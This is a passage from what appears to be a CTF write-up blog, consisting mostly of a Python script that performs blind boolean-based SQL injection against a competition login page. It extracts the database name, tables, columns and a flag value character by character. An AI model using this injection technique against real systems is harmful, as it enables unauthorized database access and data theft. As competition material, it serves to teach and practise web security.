<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://129.211.173.64:3080/login.php&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_in</span>(<span class="params">change_pa</span>):</span></span><br><span class="line">    database = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">        low=<span class="number">0</span></span><br><span class="line">        high=<span class="number">264</span></span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> (low &lt; high):</span><br><span class="line">            payload=<span class="string">f&quot;1%1$&#x27;) or ascii(substr((<span class="subst">&#123;change_pa&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>#&quot;</span></span><br><span class="line">            data=&#123;<span class="string">&quot;password&quot;</span>:payload,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;a&quot;</span>&#125;</span><br><span class="line">            r=s.post(url=url,data=data).text</span><br><span class="line">            <span class="comment">#print(data)</span></span><br><span class="line">            <span class="comment">#print(r)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;NCTF&#123;3v3ryth1&quot;</span> <span class="keyword">in</span> r:</span><br><span class="line">                low=mid+<span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                high=mid</span><br><span class="line">            mid=(low+high)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">264</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        database += chr(mid)</span><br><span class="line">        print(database)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#data=&quot;database()&quot;</span></span><br><span class="line">    <span class="comment">#data=&quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot;</span></span><br><span class="line">    <span class="comment">#data = &#x27;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x4e635446&#x27;</span></span><br><span class="line">    data=<span class="string">&#x27;select/**/`fl@g`/**/from/**/NcTF limit 1,1&#x27;</span></span><br><span class="line">    <span class="comment">#data=&quot;version()&quot;</span></span><br><span class="line">    sql_in(data)</span><br></pre></td></tr></table></figure></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/11/29/2021i%E6%98%A5%E7%A7%8B%E7%A7%8B%E5%AD%A3%E4%B8%AA%E4%BA%BA%E8%B5%9B/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">2021i春秋秋季个人赛</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/11/27/2021%E5%AE%89%E6%B4%B5%E6
